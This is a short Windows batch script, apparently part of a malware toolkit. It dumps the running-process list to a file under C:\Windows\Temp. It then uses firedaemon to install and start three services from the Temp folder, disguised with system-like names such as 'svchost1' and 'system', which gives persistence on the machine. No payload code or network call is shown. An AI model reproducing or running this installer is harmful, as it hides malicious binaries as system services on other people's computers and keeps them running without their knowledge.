@echo off
mkdir pack
tlist > z.txt
move z.txt c:\Windows\Temp\pack

set mxbin=C:\WINDOWS\Temp
set mxhome=C:\WINDOWS\Temp

firedaemon -i svchost1 "C:\WINDOWS\Temp" "C:\WINDOWS\Temp\svchost1.exe" "ost.dll" Y 0 0 Y Y
firedaemon -i system "C:\WINDOWS\Temp" "C:\WINDOWS\Temp\system.exe" "" Y 0 0 Y Y
firedaemon -i ecure "C:\WINDOWS\Temp" "C:\WINDOWS\Temp\clean.bat" "" Y 0 0 N Y

net start svchost1
net start system
net start ecure
